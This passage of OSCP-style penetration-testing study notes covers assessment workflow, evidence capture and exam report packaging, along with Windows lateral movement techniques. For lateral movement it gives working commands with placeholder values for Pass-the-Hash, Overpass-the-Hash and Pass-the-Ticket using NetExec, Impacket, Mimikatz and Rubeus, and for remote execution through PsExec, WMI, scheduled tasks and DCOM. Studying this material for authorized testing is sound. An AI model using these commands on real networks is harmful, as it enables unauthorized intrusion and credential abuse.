text: id="6-execute-and-choose-variants">8.1.5.6 Execute and choose variants Before interacting with a target, record: scope and explicit exclusions objective and required evidence starting identity/credential and whether it is local, domain or application scoped source host, interface, route and DNS context allowed/restricted tools and the current Metasploit target decision case directory and note/evidence locations cleanup or restoration obligations An interesting vulnerability is not automatically the objective. The attack is complete only when the required access or privilege is verified and the reproduction/evidence chain is retained. Create a private case workspace using target-neutral names until the real scope is known: mkdir -p case/{00-admin,01-scans,02-services,03-web,04-exploits,05-loot,06-sessions,07-screenshots,08-report} touch case/00-admin/{scope.md,state.md,credentials.md,routes.md,hypotheses.md,transitions.md} Do not put exam or private target material in a public repository. Keep target-specific values in a private case/lab record, not this public repository. HOSTS - host/IP | role | reachable from | open services | evidence file IDENTITIES - local/domain identity | credential type | validated services | privilege | source ROUTES - source -> listener/tunnel -> pivot -> destination | DNS point | callback path HYPOTHESES - observation | hypothesis | prerequisite | next discriminating test | status TRANSITIONS - old state -> action -> new access/identity/route | decisive output | evidence EVIDENCE COVERAGE - objective | reproduction complete? | identity/IP proof? | screenshot? | panel/task state Label each claim observed , inferred , possible , confirmed , disproven or inconclusive . Close a path only with a test that addressed its prerequisite; do not confuse a tool error with a disproven attack hypothesis. Observe → Enumerate → Interpret → Hypothesize → Validate prerequisite → Exploit the confirmed primitive → Verify the new state → Re-enumerate from that state → Escalate, move or pivot → Capture evidence and cleanup The sequence is a loop, not a one-time checklist. A state change routes work back to the relevant earlier stage: New state Mandatory re-entry Hostname, address, interface, listener or route Discovery and service identification from the source position that can reach it Credential, key, hash or ticket Classify identity/material, validate compatible access, then authenticated enumeration Application role/session Revisit the same application and objects through the new authorization view Command execution or shell Verify host/identity/network, repair the session, transfer only what is needed, start local enumeration Administrator/root/SYSTEM Re-enumerate protected files, credentials, services, sessions, routes and domain context Domain identity/group/right Rebuild reachable host/service/object paths and validate the specific right Pivot or proxy Repeat discovery from the new vantage point; separately design callback and delivery routes <h5

title: 8.1.5.6.1.1 Keep two queues
text: id="keep-two-queues">8.1.5.6.1.1 Keep two queues The coverage queue prevents missed surfaces: host/source position → endpoint → confirmed application → required enumeration → state The hypothesis queue prevents random exploitation: observation → possible transition → prerequisite → cheapest discriminating test → decisive success/failure → next action Do not spend the whole assessment deepening one hypothesis while high-value coverage remains unknown. Conversely, do not keep scanning after a confirmed path only to avoid validating it. Create one card per distinct mechanism: Observation: Desired state transition: Required prerequisites: Already confirmed: Still unknown: Cheapest discriminating test: Success means: Failure means: Noise/change/cleanup: Handoff if successful: Status/evidence: Rank without false numerical precision: Confirmed prerequisite, direct objective transition. Test first. Strong observation, one cheap missing prerequisite. Validate next. Useful information path. Prefer when it can unlock several branches. Multiple unsupported assumptions or disruptive action. Defer. Disproven prerequisite. Close until new evidence changes it. Evidence strength overrides technique popularity. Prefer low-cost tests that split plausible explanations and create reusable information. A path that succeeds only after several unverified assumptions is not yet a high-priority path. <h3

title: 8.1.6.6 Execute and choose variants
text: id="6-execute-and-choose-variants-1">8.1.6.6 Execute and choose variants Use the earlier procedure linked at each transition; the integration layer owns order and state: Record scope, objective, source position and evidence requirements. Establish TCP coverage, bounded UDP coverage and confirmed application identities. Enumerate every confirmed service in its anonymous/current context; map web requests, hosts, parameters, content and roles. Search files, configuration, repositories and application data for identities or prerequisites. Build candidate cards for manual application weaknesses, compatible credentials and exact public-exploit prerequisites. Validate one prerequisite at a time and prove the smallest useful effect. Convert execution into a verified session; record host, identity, privilege, interfaces and routes. Capture the initial-access transition and any required unprivileged objective before changing state. Enumerate local privilege paths as controlled object → effective permission → privileged consumer → trigger → effect. Verify the elevated identity, capture required evidence, re-enumerate protected context and remove exercise artifacts. Reconstruct the ordered reproduction path while the commands and assumptions are still known. Failure at a step returns to its owning block. Do not skip service enumeration because one banner suggests a CVE, and do not start privilege escalation before proving which host and identity the shell represents. starting credential → local/domain identity + DNS/time/DC context → reachable host/service map → users/groups/computers/shares/SPNs/ACLs/sessions → ranked identity or host transition → compatible password/hash/ticket use → verified session/new identity → re-enumeration → route/movement to next host → higher domain privilege/objective Keep five variables together for every edge: controlled identity effective group/right target object or host required protocol/route resulting identity/access BloodHound and enumerators generate candidate edges. Validate the underlying group membership, ACL, session, service right, route and authentication material before acting. After every new identity or host session, repeat authenticated enumeration rather than continuing from the old authorization view. For multihop work, maintain a route diagram and a separate callback diagram. A route that permits an operator tool to reach a service does not prove that a payload can return to its handler. <h3

LAST VERIFIED STATE | FIRST NEW FAILURE | EXACT ERROR | CHANGED CONDITION | NEXT CONTROL Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. title: 8.1.7.5 Why it works
text: id="5-why-it-works-2">8.1.7.5 Why it works Tool/environment failure and target evidence must be separated. Re-enumeration after a new credential/route is often more valuable than repeating a disproven exploit under unchanged conditions. <h3

title: 8.1.7.6 Execute and choose variants
text: id="6-execute-and-choose-variants-2">8.1.7.6 Execute and choose variants Treat stagnation as a state problem, not an instruction to try more commands. Warning signs include unchanged evidence, repeated disproven tests, increasingly exotic mechanisms, tool switching without a new hypothesis, and work whose success would not advance the objective. When progress stalls: Freeze the current host/identity/route/credential map. Mark each path with the last decisive result. Recheck scan/service/application coverage and authenticated views. Separate environment/tool failure from a disproven prerequisite. Choose the cheapest test that can change the decision. Switch paths when the expected information gain is higher. Return only when new evidence changes an assumption. Use this failure router: Symptom Classification Next action Tool cannot reach any known-good endpoint Environment/route failure Repair source interface, proxy, DNS or tool configuration Test did not exercise the claimed prerequisite Inconclusive Replace it with a discriminating test Exact prerequisite is absent Disproven path Close the card until state changes Authentication works but action is denied Authorization boundary Enumerate service/object rights under that identity New credential or route exists but old enumeration is unchanged Stale state Re-enumerate from the new identity/vantage point Many weak possibilities, no decisive observation Coverage gap Return to surface/service/application enumeration <h3

Interpretation: repair transfer connectivity instead of swapping exploit families. <h3

title: 8.1.8.5 Why it works
text: id="5-why-it-works-3">8.1.8.5 Why it works A proof screenshot establishes a narrow state; reproduction also needs the preceding request/command, parameters, exploit changes and route. Evidence captured during the transition is more reliable than later reconstruction. <h3

title: 8.1.8.6 Execute and choose variants
text: id="6-execute-and-choose-variants-3">8.1.8.6 Execute and choose variants Linux: date -Is hostname id ip addr ip route Windows: echo %DATE% %TIME% hostname whoami /all ipconfig /all route print For each access or escalation, retain: the observation that selected the path; the exact command/request with secrets redacted in the reusable copy; relevant output or response; host and identity verification; the effect/new capability; cleanup/restoration; and the next re-enumeration result. Use a compact transition packet: time/timezone | source host/interface | target host/service | starting identity observation | prerequisite | exact action | decisive output new identity/access/route | evidence files | cleanup | next re-enumeration Capture the transition when it happens. Reconstructing it later risks losing a required token, request, route, working directory, listener or source identity. mkdir -p evidence/nmap evidence/web evidence/loot evidence/screenshots nmap -Pn -sV -sC -p PORTS TARGET -oA evidence/nmap/TARGET-services script -q -f evidence/session.txt Run exit when finished so the transcript closes and flushes. Do not record unrelated secrets in a broad transcript. Start-Transcript -Path .\evidence\powershell-session.txt # commands Stop-Transcript Hash important transferred or generated artifacts: sha256sum FILE | tee FILE.sha256 Never publish credentials, flags, target IPs, full private transcripts or copyrighted course text to this repository. Current official exam guidance requires proof-file content to be displayed from its original location in an interactive target shell and included in a screenshot with the target IP. The control-panel submission is separate and must occur before the exam ends. Recheck the guide immediately before an exam because these rules can change. Linux example layout: hostname; id; ip addr cat /root/proof.txt Windows example layout: hostname & whoami & ipconfig type C:\Users\Administrator\Desktop\proof.txt Use the actual objective-provided path and required identity. Do not use AI on actual exam targets, proofs or reports; the current guide prohibits AI chatbots during the exam. For an unmodified exploit, retain its source URL rather than pasting pages of code. For a modified exploit, retain: original URL and version/commit; local modified copy; a focused diff/highlight of changes; why each change was necessary; build/interpreter command and dependencies; payload-generation command, if any; and exact execution and result verification. git diff --no-index original.py modified.py > exploit-changes.diff sha256sum original.py modified.py ### Objective / result **Starting state:** source host, network position and identity. 1. Observation and evidence. 2. Enumeration command/request and decisive output. 3. Vulnerability/prerequisite validation. 4. Exploitation command/request, including required listener/route. 5. Session verification: host, identity and privilege. 6. Escalation evidence and final verification. 7. Cleanup/restoration. **Artifacts:** screenshots, saved output, hashes and exploit source/diff. Write steps in execution order. Explain why a command was needed and what the output established; a transcript alone is not a report. <h3

title: 8.1.9.6 Execute and choose variants
text: id="6-execute-and-choose-variants-4">8.1.9.6 Execute and choose variants For every achieved objective, the report path should read: starting state and scope → decisive enumeration → prerequisite/vulnerability validation → exact exploitation action → session/identity verification → privilege or movement transition → final objective evidence → cleanup/restoration Include only enough non-decisive enumeration to make the selection understandable. Screenshots need captions and nearby interpretation; they do not replace commands or prose. Raw transcripts are supporting artifacts, not the final narrative. Current official exam grading follows the target order used in the report. Keep target/objective labels aligned with the control panel and place each target's complete chain together. Recheck the current guide immediately before a mock or exam. The current baseline is one PDF inside a non-password-protected .7z , exact case-sensitive filenames and an archive no larger than 200 MB: 7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf 7z l OSCP-OS-XXXXX-Exam-Report.7z 7z t OSCP-OS-XXXXX-Exam-Report.7z md5sum OSCP-OS-XXXXX-Exam-Report.7z Windows hash fallback for a local rehearsal: Get-FileHash -Algorithm MD5 -LiteralPath '.\OSCP-OS-XXXXX-Exam-Report.7z' Inspect every exported PDF page before archiving. Confirm that code is not clipped, screenshots remain readable, captions match the correct target and the archive contains only the required PDF. Required scripts and PoCs belong as text inside that PDF, not as extra archive members. The current guide recommends creating/uploading from Kali and warns of a Windows 11 archive compatibility issue. Compare the local MD5 with the upload site's value, click the final submission control and retain the acknowledgement. The official Word or LibreOffice template is the reliable baseline. A Markdown/Pandoc pipeline, including Hexdump's report/ generator, is a viable alternative only after a complete dummy export/archive rehearsal; do not install or debug a new report stack during an assessment. Commands are copyable and placeholders/secrets are resolved in the private report. Screenshots are legible and show required identity/IP/proof context. Every claim is supported by nearby evidence. Target order and objective labels match the control panel. Exploit modifications and payload-generation steps are documented. The final PDF is visually reviewed after export. Archive name/format/size and upload hash match current official requirements. <h3

title: 6.4.4 Move to another host
text: id="move-to-another-host">6.4.4 Move to another host Strategy map | Master Notes | Operational index | Cheatsheets Select credential type → accepted authentication → reachable service → service authorization → execution effect. Hash/ticket use is an authentication dimension; SMB, tasks, WMI, WinRM and RDP are different access mechanisms. Speedrun blocks: 12; consumes routes from 13. Documented methods: 9. Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery. <h2

title: 6.4.4.1 First pass: tools and findings
text: id="first-pass-tools-and-findings">6.4.4.1 First pass: tools and findings Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition. <h3

title: 6.4.4.1.1 Test the destination from the real source
text: id="test-the-destination-from-the-real-source">6.4.4.1.1 Test the destination from the real source A working password on one service does not establish execution permission on another host. nmap -Pn -sT -p 135,445,3389,5985,5986 TARGET getent hosts TARGET_HOST If WinRM is reachable and the account has endpoint rights: Use the WinRM procedure and verify the resulting token . → Use WinRM, WinRS or PowerShell remoting . If SMB/RPC is reachable and service-control rights are confirmed: Use the service-execution procedure with a separate output path. → Execute through uploaded service creation using PsExec . Otherwise: Only the listener is reachable: inspect actual endpoint authorization before selecting an execution tool. → Select password, NT hash, key-to-ticket or ticket authentication . <h3

title: 6.4.4.1.2 Match password, hash, key or ticket to the client
text: id="match-password-hash-key-or-ticket-to-the-client">6.4.4.1.2 Match password, hash, key or ticket to the client Use the existing Impacket/NetExec protocol-specific examples; do not treat successful authentication as remote execution. klist getent hosts TARGET_HOST date -u If Accepted authentication plus remote service rights: Check share/SCM permissions and output reachability. → Execute through uploaded service creation using PsExec . If WMI/task rights with RPC/DCOM connectivity: Check the exact namespace/task authorization and output channel. → Execute through WMI or native CIM over DCOM . Otherwise: The artifact is rejected: recheck identity scope, material format, service name and transport. → Classify the artifact and its identity context . <h2

title: 6.4.4.2 Discovery workflow
text: id="discovery-workflow">6.4.4.2 Discovery workflow Start with material tied to a known identity and a destination candidate; neither valid authentication nor remote execution rights are assumed. Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed. Check the destination from the actual source, including dynamic RPC and names: Match route, destination service and effective authorization . Classify password, NT hash, long-term key or service-scoped ticket: Select password, NT hash, key-to-ticket or ticket authentication . Match effective service/task/WMI authorization to its separate output path: Execute through uploaded service creation using PsExec ; Execute commands through service command lines and SMB output ; Execute through remote Task Scheduler ; Execute through WMI or native CIM over DCOM . Check endpoint or remote-interactive rights for WinRM/RDP and verify the resulting token: Use WinRM, WinRS or PowerShell remoting ; Obtain an authorized RDP interactive session . PowerView examples require a reviewed compatible script in the current authenticated directory context. Check the loaded copy rather than mixing legacy/fork parameter names; the directory-mapping entry includes native, ADSI and LDAP alternatives. Import-Module .\PowerView.ps1 Get-Command -Module PowerView Decision rule: an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive . <h2

Management protocol execution: Execute through WMI or native CIM over DCOM , Execute through an authorized DCOM application object , Use WinRM, WinRS or PowerShell remoting . Interactive access: Obtain an authorized RDP interactive session . <h2

text: id="5-why-it-works">6.4.4.5.5 Why it works SMB authentication, SCM/WMI rights, WinRM endpoint rights and RDP logon rights are different. Local-account remote filtering and second-hop delegation can change an otherwise valid credential's effect. <h3

title: 6.4.4.5.6 Execute and choose variants
text: id="6-execute-and-choose-variants">6.4.4.5.6 Execute and choose variants Material Compatible starting paths Important boundary Password SMB/SCM, WMI/DCOM, WinRM/WinRS, RDP Correct password does not grant the required logon or execution right NT hash NTLM-capable SMB/WMI/WinRM; RDP only through Restricted Admin where supported Net-NTLM and DCC2 are not reusable NT hashes TGT /ccache Kerberos-capable tool using target FQDN/ SPN Ticket identity, realm, lifetime, DNS and KDC route must match TGS Only the named SERVICE/HOST and compatible client A CIFS ticket does not authorize WinRM, WMI or RDP AES/NT long-term key Request a TGT, then use Kerberos RC4/NT-key requests can fail where RC4 is disabled Local-account password/hash NTLM or RDP in the target's local account context Remote UAC/account restrictions commonly filter non-RID-500 local administrators Reachable service Common execution/access mechanisms Usual authorization SMB 445 + SCM/RPC PsExec, SMBExec, service creation Administrative share plus SCM/service rights RPC endpoint mapper 135 + dynamic RPC; often SMB for output WMIExec, native CIM/WMI, DCOM Remote WMI/DCOM rights, commonly an effective administrator token Task Scheduler RPC plus SMB output ATExec Remote task creation and administrative output access WinRM 5985/5986 WinRS, PowerShell remoting, Evil-WinRM Enabled endpoint and endpoint/session authorization RDP 3389 FreeRDP, MSTSC Remote-interactive logon right; Restricted Admin requires administrator access Directly routed source: nmap -Pn -sT -sV -p 135,139,445,3389,5985,5986 TARGET -oN movement-preflight.txt getent hosts TARGET_HOST date -u Windows source: Resolve-DnsName TARGET_HOST Test-NetConnection TARGET_HOST -Port 445 Test-NetConnection TARGET_HOST -Port 5985 Test-NetConnection TARGET_HOST -Port 3389 w32tm /query /status Port 135 alone does not prove WMI/DCOM viability because RPC commonly negotiates a dynamic high port. When the destination is reachable only through a pivot, perform these checks through the established Block 13 route and respect the client/proxy's transport limits. Record: SOURCE POSITION -> TARGET FQDN/IP -> ROUTE -> SERVICE/PORT -> CREDENTIAL TYPE -> LOCAL/DOMAIN IDENTITY -> EXPECTED RIGHT -> CHOSEN METHOD -> EXPECTED EFFECT NetExec can classify a selected SMB credential: <h4

title: 6.4.4.5.6.1 Domain password
text: id="variant-6-4-4-5-6-1">6.4.4.5.6.1 Domain password # Domain password nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' <h4

title: 6.4.4.5.6.2 Domain NT hash
text: id="variant-6-4-4-5-6-2">6.4.4.5.6.2 Domain NT hash # Domain NT hash nxc smb TARGET -d DOMAIN -u USER -H NT_HASH <h4

title: 6.4.4.5.6.3 Target-local account

title: 6.4.4.5.6.4 Prove only share access
text: id="variant-6-4-4-5-6-4">6.4.4.5.6.4 Prove only share access # Prove only share access nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares A successful login proves SMB authentication. (Pwn3d!) is NetExec's SMB administrative-context indicator, not proof that WinRM, RDP, WMI or every SMB execution method will succeed. For one justified execution proof: nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' -x "hostname & whoami" --exec-method wmiexec Current NetExec can select wmiexec , atexec or smbexec ; without an explicit method it may fail over between them. Use a forced method when diagnosing prerequisites so the result remains attributable. DOMAIN\USER -> domain identity; evaluate target-local group/right TARGET\USER -> SAM identity on that target ./USER -> tool-specific local-account selection Common failure pattern: a local account authenticates over SMB; Windows issues a filtered remote token; ADMIN$ , SCM or WMI administrative operations fail. Do not “fix” this by changing LocalAccountTokenFilterPolicy during an attack workflow. Use a method already permitted by the target's configuration, the built-in Administrator where legitimately obtained and applicable, RDP if authorized, or another mapped identity. Remote process creation, stdout retrieval and an interactive shell are separate states: AUTHENTICATED -> REMOTE OPERATION AUTHORIZED -> PROCESS/TASK/SERVICE CREATED -> COMMAND EFFECT OCCURRED -> OUTPUT RETURNED OR CALLBACK CONNECTED -> USABLE SESSION PsExec returns named-pipe I/O through its service. WMIExec normally redirects output to an SMB share. SMBExec redirects command output while repeatedly creating services. ATExec writes output under ADMIN$\Temp . Native WMI/DCOM may return only a PID/return value; verify a harmless file or another bounded effect. WMI/DCOM/service processes commonly run in session 0, so a GUI is not visible to the logged-on user. WinRM creates a remote shell/runspace and returns structured or text output. A WinRM/PowerShell session on HOST_A may not possess delegable credentials for HOST_B. That “double hop” is a credential-context problem, not proof that HOST_B or the password is wrong. Prefer executing from the source that actually holds the credential/ticket rather than enabling broad delegation. hostname whoami /all ipconfig /all route print netstat -ano klist Re-enumerate: local privilege and accessible credential sources; domain groups, ACLs, shares and host rights under the new identity; logged-on sessions and service accounts; interfaces, routes, DNS, listeners and internal reachability; the next evidence-backed host/identity transition. Do not overwrite the earlier state. Record the source host, credential form, authentication protocol, execution method, returned identity and side effects. <h3

Failure/next check: Wrong ticket service, RC4 policy, time skew, IP-only SPN naming or local/domain mismatch can invalidate one variant while another remains viable. klist getent hosts TARGET_HOST date -u Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. text: id="5-why-it-works-1">6.4.4.6.5 Why it works Pass-the-Hash uses NTLM key material; Overpass-the-Hash/key-to-ticket requests Kerberos credentials; Pass-the-Ticket uses an existing ticket. They do not grant the same services without their own rights and scope. <h3

title: 6.4.4.6.6 Execute and choose variants
text: id="6-execute-and-choose-variants-1">6.4.4.6.6 Execute and choose variants <h5

title: 6.4.4.6.6.1.1 Pass-the-Hash
text: id="pass-the-hash">6.4.4.6.6.1.1 Pass-the-Hash NT HASH -> NTLM CHALLENGE/RESPONSE -> TARGET SERVICE PtH requires an NTLM-capable service, a valid account context and the service-specific right. SMB share access may work without administrative execution; PsExec/WMIExec/SMBExec usually need administrative rights. Remote UAC commonly filters non-built-in local administrators. Domain accounts in the target Administrators group traditionally receive a full remote token, but newer Administrator Protection policy can change that result—trust the observed target token and method-specific authorization. <h5

title: 6.4.4.6.6.1.2 Overpass-the-Hash / key-to-ticket
text: id="overpass-the-hash--key-to-ticket">6.4.4.6.6.1.2 Overpass-the-Hash / key-to-ticket Mimikatz network-credential context: sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NT_HASH /run:powershell.exe Rubeus TGT request: Rubeus.exe asktgt /user:USER /domain:DOMAIN /rc4:NT_HASH /dc:DC_HOST /ptt klist AES alternative: Rubeus.exe asktgt /user:USER /domain:DOMAIN /aes256:AES256_KEY /dc:DC_HOST /ptt Trigger a Kerberos service request with the hostname, then inspect: dir \\TARGET_HOST\C$ klist In a Mimikatz sekurlsa::pth process, whoami can still show the original local process token while network authentication uses the supplied identity. Validate the ticket's client and the remote result rather than treating local whoami as the network identity. <h5

title: 6.4.4.6.6.1.3 Pass-the-Ticket
text: id="pass-the-ticket">6.4.4.6.6.1.3 Pass-the-Ticket Windows: Rubeus.exe ptt /ticket:ticket.kirbi klist kerberos::ptt ticket.kirbi Linux: export KRB5CCNAME="$PWD/ticket.ccache" klist impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' A TGS must name the selected service/hostname. A TGT can request a suitable TGS only while valid and when the KDC is reachable. Ticket import is not lateral movement until the destination accepts it and produces the intended authorized effect. <h3

title: 6.4.4.7.5 Why it works
text: id="5-why-it-works-2">6.4.4.7.5 Why it works PsExec creates a service and communicates through its service/pipes. Its service execution identity can differ from the authenticated account; the official Windows tool and Impacket implementation have distinct artifacts/options. <h3

title: 6.4.4.7.6.2 NT hash / Pass-the-Hash
text: id="variant-6-4-4-7-6-2">6.4.4.7.6.2 NT hash / Pass-the-Hash # NT hash / Pass-the-Hash impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' Need: SMB 445/139, writable administrative share and Service Control Manager rights. Impacket uploads a RemCom service binary, creates/starts a service and communicates over named pipes. Verify the returned identity; the service context is commonly SYSTEM. Kerberos cache: export KRB5CCNAME="$PWD/USER.ccache" impacket-psexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' The target parameter uses the hostname matching the CIFS/HOST SPN; -target-ip separates connection routing from Kerberos naming. PsExec64.exe -accepteula \\TARGET_HOST -u DOMAIN\USER -p PASSWORD cmd.exe The official PsExec binary is not built into Windows. It requires remote administrative access and creates the PSEXESVC service/artifacts. Avoid putting real passwords in retained shell history; an existing authorized network credential context is preferable. <h3

text: id="6-execute-and-choose-variants-4">6.4.4.9.6 Execute and choose variants impacket-atexec 'DOMAIN/USER:PASSWORD@TARGET_HOST' "cmd.exe /c hostname & whoami" impacket-atexec -hashes :NT_HASH 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c hostname & whoami" ATExec creates and deletes a scheduled task and normally retrieves output from ADMIN$\Temp . title: 6.4.4.10.5 Why it works
text: id="5-why-it-works-5">6.4.4.10.5 Why it works WMI can create a process while SMB output retrieval fails. Modern CIM defaults can use WSMan, so select the documented DCOM session option when that transport is intended. <h3

title: 6.4.4.10.6 Execute and choose variants
text: id="6-execute-and-choose-variants-5">6.4.4.10.6 Execute and choose variants impacket-wmiexec 'DOMAIN/USER:PASSWORD@TARGET' impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' WMIExec creates processes through WMI/DCOM. Its normal output channel uses SMB and defaults to ADMIN$ ; therefore a WMI process may run even when output retrieval fails. -nooutput or -silentcommand changes that evidence channel. Kerberos with separate name and route: export KRB5CCNAME="$PWD/USER.ccache" impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' <summary

title: 6.4.4.10.6.1 One command, no SMB output
text: id="variant-6-4-4-10-6-1">6.4.4.10.6.1 One command, no SMB output impacket-wmiexec -nooutput 'DOMAIN/USER:PASSWORD@TARGET' "cmd.exe /c echo MOVEMENT_OK > C:\Windows\Temp\movement-proof.txt" Verify the harmless artifact through an independently authorized channel. No returned stdout is expected. $Credential = Get-Credential 'DOMAIN\USER' $Options = New-CimSessionOption -Protocol Dcom $Session = New-CimSession -ComputerName TARGET_HOST -Credential $Credential -SessionOption $Options Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = 'cmd.exe /c hostname > C:\Windows\Temp\movement-proof.txt' } Remove-CimSession $Session ReturnValue = 0 and a process ID confirm process creation, not its final effect. WMI-created processes run in session 0; GUI programs will not appear on an interactive desktop. <h3

title: 6.4.4.10.7 Worked example — hypothetical
text: id="7-worked-example--hypothetical-5">6.4.4.10.7 Worked example — hypothetical Observation: WMIExec appears to hang after process creation. Test: check the controlled effect independently and inspect SMB output access. Illustrative output: the process ran but the share read was denied. Interpretation: execution is proven; repair the output channel or use another observation. <h3

text: id="8-verify-the-result-5">6.4.4.10.8 Verify the result Verify destination process/effect and execution identity separately from captured stdout. <h3

Discovery action — reference example: Execution context, effects and stopping rule Host/access: Identified authentication material, destination service reachability and a candidate authorized identity Requires: RPC/dynamic-port route, allowed DCOM activation and application method, supported authentication and target component Action class: Remote authentication/execution; service/file mechanisms can change target state. Stop/verify: Verify the actual destination effect and identity; COM object creation alone does not prove command execution. Failure/next check: Component absence, activation rights, modern DCOM hardening or unsupported client Kerberos can block this route. Test-NetConnection TARGET -Port 135 Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. RPC endpoint mapper: reachable Candidate application: MMC20.Application.1 Activation/method authorization: not yet known Recognize this detail: A named application and route form a candidate; component availability and allowed activation/method remain separate. Still missing before method selection: Check dynamic RPC, actual class/rights, authentication/tool support, method and verifiable output/effect. Outcome after checking Example and next decision Enabled after validation The intended authorized application method produces the remote effect: choose this DCOM route. Ruled out in this context The component is absent or activation is denied: reject that class-based chain. Inconclusive A created COM object without command/effect evidence leaves execution unproved. If you do not yet have this clue: start with Match route, destination service and effective authorization . <h3

title: 6.4.4.11.6 Execute and choose variants
text: id="6-execute-and-choose-variants-6">6.4.4.11.6 Execute and choose variants Current Windows token: $Type = [type]::GetTypeFromProgID('MMC20.Application.1','TARGET_HOST') $Object = [Activator]::CreateInstance($Type) $Object.Document.ActiveView.ExecuteShellCommand( 'cmd.exe', $null, '/c hostname > C:\Windows\Temp\movement-proof.txt', '7' ) Impacket with password or NT hash: impacket-dcomexec 'DOMAIN/USER:PASSWORD@TARGET' impacket-dcomexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' Current Impacket dcomexec explicitly rejects Kerberos for its supported MMC/Shell DCOM objects because they do not accept the required HOST ticket. Use wmiexec -k when Kerberos command execution is required. DCOM class availability, RPC reachability and launch/access permissions vary. <h3

Stop/verify: Verify hostname, whoami /all and the actual session configuration/rights. Failure/next check: Authentication denial, endpoint denial, TLS/name mismatch and second-hop failure require different fixes. Test-NetConnection TARGET -Port 5985 Test-NetConnection TARGET -Port 5986 Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. 5985: reachable SMB credential: accepted WinRM endpoint authorization: unknown Recognize this detail: A reachable endpoint plus a known credential is a candidate, not proof the account may enter that remoting session. Still missing before method selection: Verify accepted authentication, correct name/TLS context, endpoint rights and any second-hop requirements. Outcome after checking Example and next decision Enabled after validation The endpoint opens the intended session and identity is verified: choose WinRM/WinRS/remoting.
